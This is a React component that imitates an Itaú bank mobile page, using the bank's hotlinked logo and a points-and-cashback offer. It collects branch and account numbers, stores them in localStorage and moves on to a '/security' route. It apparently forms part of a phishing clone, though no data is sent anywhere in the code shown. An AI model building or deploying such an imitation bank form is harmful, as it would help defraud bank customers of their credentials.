import React from 'react'
import { useState } from 'react'
import {Link} from 'react-router-dom'
import InputMask from 'react-input-mask';
import './FisicaMobile.css'

const FisicaMobile = () => {
  const [ag, setAg] = useState("");
  const [conta, setConta] = useState("");

  const setMemory = () => {
    localStorage.setItem("ag", ag);
    localStorage.setItem("conta", conta);
  }
  
  const gravaAgencia = (event) => {
    setAg(event.target.value);
  };
  const gravaConta = (event) => {
    setConta(event.target.value);
  };

  return (
    <div className='FisicaMobile'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title1'>
            <span>Ponto a ponto</span>
            <p>Ganhe pontos e cashback e<br />use esse benefício para economizar</p>
        </div>
        <div className='form1'>
            <InputMask mask="9999" className='digitavel' type="text" placeholder='agência' onChange={gravaAgencia} disableUnderline  />
            <InputMask mask="9999999-9" className='digitavel' type="text" placeholder='conta' onChange={gravaConta} disableUnderline  /><br /><br />
            <input type="checkbox" /><label>lembrar de mim</label><br /><br /><br />
            <Link to="/security"><button onClick={setMemory}>próximo</button></Link>
        </div>
    </div>
  )
}

export default FisicaMobile